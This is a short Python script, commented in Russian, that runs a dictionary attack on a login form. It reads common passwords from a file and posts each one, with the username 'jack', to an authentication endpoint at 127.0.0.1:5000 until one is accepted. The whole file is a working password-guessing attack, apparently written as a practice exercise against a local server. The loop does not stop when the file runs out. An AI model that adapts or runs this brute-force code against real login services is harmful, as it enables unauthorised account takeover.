import requests
"""
Поиск пароля по базе наиболее популярных
"""
login = 'jack'


if __name__ == '__main__':
    with open('pop-passwords.txt') as password_file:                    # для уменьшения нагрузки на оперативную память
        while True:                                                     # используем итеративный способ чтения файла
            password = password_file.readline().strip()
            data = {'login': login, 'password': password}
            response = requests.post('http://127.0.0.1:5000/auth', json=data)
            if response.status_code == 200:
                print('Password %s for %s Found!' % (password, login))
                break
            else:
                print(f'{password=} is incorrect')
